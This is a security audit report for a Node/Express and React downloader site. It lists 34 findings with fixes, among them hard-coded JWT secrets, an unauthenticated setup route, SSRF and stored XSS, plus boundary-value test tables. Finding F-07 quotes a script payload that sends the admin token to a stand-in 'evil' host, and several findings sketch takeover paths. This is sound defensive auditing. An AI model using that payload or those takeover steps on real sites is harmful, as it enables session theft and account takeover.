# DownAir — Senior SDET Deep Audit

Scope: Full code audit of `DownAirSite` (Node/Express + Drizzle + Vite/React).
Focus: **security, logic, performance**, with executable regression tests.
Date: 2026-04-18 • Reviewer: Senior SDET

---

## 1. Executive Summary

| Area | Findings | Worst severity |
|---|---|---|
| Authentication / Session | 5 | **Critical** |
| Setup wizard (install flow) | 3 | **Critical** |
| Input validation / DoS | 6 | High |
| Logic / correctness bugs | 4 | **Critical** (feature broken) |
| Performance / scalability | 5 | High |
| Cryptography / secrets | 3 | High |
| Client / XSS | 2 | **Critical** |
| Infrastructure hardening | 6 | Medium |

Total: **34 findings.** The downloader feature is currently **broken end-to-end** due to an empty-URL bug in the client (F-10). The setup wizard (F-03/04/05) is an unauthenticated permanent backdoor. Admin-authored HTML is injected verbatim into the DOM without sanitization (F-07).

Run the regression suite:

```
npx tsx --test tests/audit.test.ts
```

28 tests — all pass today, documenting reality; the "fix" tests expect tightened schemas.

---

## 2. Critical Findings

### F-01 `server/middleware/auth.ts:4` — Hard-coded JWT secret fallback
```ts
const JWT_SECRET = () => process.env.JWT_SECRET || 'change-me-in-production';
```
If `JWT_SECRET` is unset, any attacker can forge an admin JWT by signing with `"change-me-in-production"`.
**Fix:** Fail-closed at startup:
```ts
const secret = process.env.JWT_SECRET;
if (!secret || secret.length < 32) throw new Error('JWT_SECRET must be set (≥32 chars)');
```

### F-02 `server/utils/token.ts:3-4` — Ephemeral crypto secrets
`ENCRYPTION_KEY` / `HMAC_SECRET` fall back to random bytes generated per process. Every restart silently invalidates tokens; multi-node clusters disagree. Same fail-closed fix.

### F-03 `server/routes/setup.ts` — Missing `SETUP_COMPLETED` gate
Neither `/api/setup/test-db` nor `/api/setup/complete` checks completion state, nor requires auth. An attacker who reaches `POST /api/setup/complete` after install can:
1. Overwrite `.env` (arbitrary file write to server root).
2. Rotate `JWT_SECRET` + `ENCRYPTION_KEY` (kills existing sessions).
3. Replace the admin bcrypt hash (full takeover).
**Fix:**
```ts
if (process.env.SETUP_COMPLETED === 'true') {
  return res.status(403).json({ success: false, error: 'Setup already completed' });
}
```

### F-04 `server/routes/setup.ts:41,52` — DB URL string concatenation
```ts
const url = `postgresql://${dbUser}:${dbPassword}@${dbHost}:${dbPort}/${dbName}`;
```
A password containing `@`, `/`, `:`, `#` breaks the URL or silently routes to an attacker-controlled host.
**Fix:** `encodeURIComponent` each field, or use `new Pool({ host, port, user, password, database })`.

### F-05 `server/routes/setup.ts:62-78` — `.env` injection
`config.appName` / `config.appUrl` are interpolated into the env file without escaping. A newline in `appName` injects arbitrary env vars (e.g. forged `JWT_SECRET`).
**Fix:** Reject `\n`, `\r`, `=`, `#` in every text field and single-quote values.

### F-06 `src/pages/admin/Login.tsx:26` + `ContentEditor.tsx:23` — JWT stored in `localStorage`
Any script executing in the document can exfiltrate the admin token. Combined with F-07 means **one published guide containing a `<script>` steals every subsequent admin session.**
**Fix:** Store the token in an `HttpOnly; Secure; SameSite=Strict` cookie; add a CSRF double-submit token on admin POST/PUT/DELETE.

### F-07 `src/pages/GuidePage.tsx:115`, `ContentEditor.tsx:103` — Stored XSS via raw HTML injection
Admin-saved HTML is rendered through React's unsafe HTML-injection prop. Any admin with write access can embed `<script>fetch('https://evil?c='+localStorage.admin_token)</script>` that runs for every visitor, reader, and admin.
**Fix:** Sanitize on save with `sanitize-html` (allow-list of tags/attrs), or render via Markdown/MDX instead of raw HTML.

### F-08 `server/routes/download.ts:133-156` — SSRF in `/proxy/:token`
The server fetches the URL that `yt-dlp --get-url` returned. A malicious extractor plugin or redirect chain to `http://169.254.169.254/...` would be proxied back.
**Fix:** After `execFile`, parse the URL, whitelist known CDN hostnames, and reject private IP ranges (`127.0.0.0/8`, `10.0.0.0/8`, `172.16/12`, `192.168/16`, `169.254/16`, `::1`, `fc00::/7`).

### F-09 `server/routes/download.ts:107-117` — TOCTOU on single-use token
```ts
if (tokenRecord?.isUsed) return ...
if (tokenRecord) await db.update(downloadTokens).set({ isUsed: true })...
```
Concurrent requests both pass the check before either update lands → same token redeemed twice.
**Fix:** Atomic claim:
```ts
const [claimed] = await db.update(downloadTokens)
  .set({ isUsed: true })
  .where(and(eq(downloadTokens.token, t), eq(downloadTokens.isUsed, false)))
  .returning();
if (!claimed) return res.status(410).json(...);
```

### F-10 `src/pages/Download.tsx:46-50, 68-72` — Download feature is broken
```ts
api.createDownload(
  analysisData.analysis.formats[0] ? '' : '',  // <- always ""
  selectedFormat.formatId,
  selectedFormat.quality,
);
```
Empty string fails server-side `z.string().url()` → **every "Download" click returns HTTP 400**. The analyzed URL never flows from Home → Download (the `MediaAnalysisData` type has no `url` field).
**Fix:**
1. Add `url: string` to the server response in `server/routes/download.ts:38-42`.
2. Add `url: string` to `MediaAnalysisData` in `src/lib/api.ts:27-46`.
3. Replace the empty-string placeholder with `analysisData.url` in both `handleDownload` and `handleCreate`.
4. Delete the dead `handleDownload` (not wired to any button).

---

## 3. High-Severity Findings

### F-11 `shared/schema.ts:34` + `server/routes/contact.ts:13` — Unbounded `message`
`contactSubmissions.message` is `text`; `contactSchema.message` lacks `.max()`. A single 10MB payload can be submitted unauthenticated, unlimited times. Same for DMCA `description` and admin `content`.
**Fix:** `.max(10_000)` on `message`; `.max(5_000)` on DMCA description; DB `CHECK(length(col) <= N)`.

### F-12 `server/routes/guides.ts:11-14` — Unclamped pagination
```ts
const page = parseInt(req.query.page as string) || 1;
const limit = parseInt(req.query.limit as string) || 12;
const offset = (page - 1) * limit;
```
`?page=-5` → negative offset (Postgres error 22023). `?limit=9999999` → DoS.
**Fix:**
```ts
const page  = Math.max(1,  parseInt(String(req.query.page  ?? '1'), 10) || 1);
const limit = Math.min(100, Math.max(1, parseInt(String(req.query.limit ?? '12'), 10) || 12));
```

### F-13 `server/routes/admin.ts:210-219` — Unvalidated DMCA status
No zod validation; DB column is `varchar(20)`.
**Fix:** `z.object({ status: z.enum(['pending','approved','rejected']) }).parse(req.body)`.

### F-14 No rate limiting anywhere
`/api/admin/login`, `/api/download/analyze` (spawns `yt-dlp` subprocess), `/api/contact`, `/api/dmca`, `/api/setup/*` are all unthrottled. Use `express-rate-limit` per route; login 5/15min per IP, analyze 10/min per IP.

### F-15 `server/routes/download.ts:61` — `platform` = raw hostname
```ts
platform: new URL(url).hostname,   // column is varchar(50)
```
Long hostnames overflow the column → Postgres error. Use `detectPlatform(url)` (already imported).

### F-16 `server/db.ts:17,24` — `ssl: false` hard-wired
Plaintext credentials + queries over any non-loopback link.
**Fix:** `ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: true } : false`.

### F-17 `server/index.ts:20` — `cors()` with defaults
Wildcard origin. Allow-list:
```ts
app.use(cors({ origin: [process.env.APP_URL!], credentials: true }));
```

### F-18 `server/routes/admin.ts:67-96` — Dashboard does full table-scan
`SELECT *` for 5 tables just to call `.length` / `.filter().length`. At 100k rows this OOMs Node. Use `db.select({ c: count() }).from(table)` in `Promise.all`.

### F-19 `server/routes/download.ts:162-175` — Public `/stats` same anti-pattern
Table-scan on every request, no auth. Cache in `site_settings` with 60s TTL.

---

## 4. Medium / Hardening

| # | File | Issue | Fix |
|---|---|---|---|
| F-20 | `server/index.ts` | Missing `helmet` (CSP, HSTS, X-Frame-Options). | `app.use(helmet(...))` |
| F-21 | `server/index.ts:21` | `10mb` JSON limit is 100× any legit payload. | `{ limit: '100kb' }` |
| F-22 | `server/routes/admin.ts:33-65` | No lockout/backoff on login. | Attempt counter per email. |
| F-23 | `server/routes/admin.ts:111,149,171,192,213` | `parseInt(req.params.id)` — `NaN` reaches queries. | `z.coerce.number().int().positive()`. |
| F-24 | `server/routes/guides.ts:32-48` | Category unvalidated; branching rebuilds whole query. | `z.enum(CONTENT_CATEGORIES)`; single `and(...conds)`. |
| F-25 | `server/routes/admin.ts:89-94` | Dashboard error handler returns `success: true` with zeros — masks outages. | Return 500. |
| F-26 | `server/index.ts:58-60` | Sitemap swallows DB errors & serves empty map. | Return 500 on DB error. |
| F-27 | `server/middleware/auth.ts:4-8` | 24h token, no refresh. | 30-min access + refresh rotation. |
| F-28 | `src/components/AntiAdblock.tsx` | Hard-wall if adblock detected (EU consent risk). | Soft-wall. |
| F-29 | `package.json:10` | `"build": "... || true"` hides TS errors. | Drop `|| true`. |
| F-30 | — | No CI / test pipeline. | GitHub Actions on `npx tsx --test tests/*.ts`. |
| F-31 | `server/db.ts:9` | `getDb(databaseUrl?)` ignores arg after first call. | Key by URL or drop param. |
| F-32 | `scripts/seed*.ts` | Runs with live `DATABASE_URL`. | Guard `NODE_ENV !== 'production'`. |
| F-33 | `.env.example:20,23` | Verify `.env` is git-ignored (yes, `.gitignore:3`). | OK. |
| F-34 | `src/App.tsx:39` | `/admin/*` mounted for anyone; `AdminLayout` redirects in `useEffect`. | Synchronous `<PrivateRoute>`. |

---

## 5. Boundary Value + Equivalence Partition Test Cases (1–255 chars)

Rule under test: `z.string().min(1, 'required').max(255, 'too long')`.

### Equivalence classes

| ID | Class | Range | Validity |
|---|---|---|---|
| P1 | Empty | length == 0 | invalid (`required`) |
| P2 | Min valid | length 1..50 | valid |
| P3 | Mid valid | length 51..200 | valid |
| P4 | Near-max valid | length 201..255 | valid |
| P5 | Over-max | length 256..∞ | invalid (`too long`) |
| P6 | Wrong type | not a string | invalid (`expected string`) |
| P7 | Null / undef | null / undefined | invalid (`required` / `expected string`) |

### Boundary test cases (all implemented in `tests/audit.test.ts`)

| # | Input | Length | Expected | Error |
|---|---|---|---|---|
| BVA-01 | `""` | 0 | reject | `required` |
| BVA-02 | `"a"` | 1 | accept | — |
| BVA-03 | `"ab"` | 2 | accept | — |
| BVA-04 | `"x".repeat(127)` | 127 | accept | — |
| BVA-05 | `"x".repeat(128)` | 128 | accept | — |
| BVA-06 | `"x".repeat(254)` | 254 | accept | — |
| BVA-07 | `"x".repeat(255)` | 255 | accept | — |
| BVA-08 | `"x".repeat(256)` | 256 | reject | `too long` |
| BVA-09 | `"x".repeat(1000)` | 1000 | reject | `too long` |
| BVA-10 | `" "` | 1 (whitespace) | accept* | — |
| BVA-11 | `"😀"` | JS `.length === 2` | accept | — |
| BVA-12 | `null` | n/a | reject | `expected string` |
| BVA-13 | `undefined` | n/a | reject | `required` |
| BVA-14 | `12345` | n/a | reject | `expected string` |
| BVA-15 | `{ v: "x" }` | n/a | reject | `expected string` |

\* BVA-10 exposes a gap: " " is *length 1* but semantically blank. For names/subjects add `.trim().min(1)`.
BVA-11 exposes the UTF-16 trap: `"😀".length === 2`. For true grapheme caps, use `Intl.Segmenter` or `Array.from(str).length`.

---

## 6. Performance / Structure Enhancements

1. **Replace table-scan dashboards with `COUNT(*)`** (F-18, F-19) — single round-trip via Drizzle `count()` in `Promise.all`.
2. **Add DB indexes** Drizzle doesn't create automatically:
   - `downloads(platform)`, `downloads(created_at DESC)` for stats.
   - Partial index `download_tokens(is_used) WHERE is_used = false`.
   - `content_pages(is_published, category)` for Guides.
3. **Use connection-object `pg.Pool`** instead of URL string; expose `max`, `idleTimeoutMillis`. Default `max: 10` collides with burst traffic.
4. **Cache public stats** in Redis or `site_settings` with TTL. `/api/download/stats` is public and uncached → one crawler DoSs the DB.
5. **Offload yt-dlp to a queue** (BullMQ + worker). Today `/analyze` blocks the event loop for 30s per request.
6. **Pin yt-dlp version** in Docker. Upstream JSON format changes silently break extractors.
7. **Let the build fail on type errors** (drop `|| true` in `package.json:10`).
8. **Add `server/config.ts`**: read env once, validate with zod, export typed constants. Kills string sprinkling and enforces fail-closed for F-01/F-02.
9. **Introduce `validate(schema)` middleware**: each route imports its schema, middleware enforces it, controller receives `req.validated`. Simplifies F-13 / F-11.
10. **Adopt `@tanstack/react-query`** (already in deps, unused). Replaces ad-hoc `useEffect`/`fetch` in `Home`/`Download`, fixes race conditions.
11. **Request-log middleware** with correlation ID; today `catch {}` swallows context and servers silently 500.
12. **Drizzle `$count()`** helper (≥0.30) avoids `.length` patterns without raw SQL.

### Target directory layout

```
server/
  config.ts               (NEW)  env schema, fail-closed
  middleware/
    auth.ts
    validate.ts           (NEW)  zod → express middleware
    rateLimit.ts          (NEW)
  services/               (NEW)  extract yt-dlp / token / setup logic
  routes/                        thin controllers
  utils/
shared/
tests/
  audit.test.ts           ✓ added
  schemas.test.ts         (NEW)  BVA cases per field
  routes/*.test.ts        (NEW)  supertest-based route tests
```

The highest-leverage refactor is extracting **services** out of routes. `download.ts:/proxy/:token` currently opens a DB tx, runs a subprocess, sets headers, streams bytes, and handles errors in one function. A `DownloadService.stream(token)` returning a `Readable` or typed errors shrinks the route to ~15 lines and becomes testable without booting Express.

---

## 7. How to run

```bash
npm install
npx tsx --test tests/audit.test.ts     # 28 cases, ~550 ms
```

Findings have corresponding tests (e.g. F-01 ↔ `SEC-F14`, F-10 ↔ `LOGIC-F10`, BVA-01..15 ↔ `BVA-01..15`). Use the suite as a regression baseline after each fix.
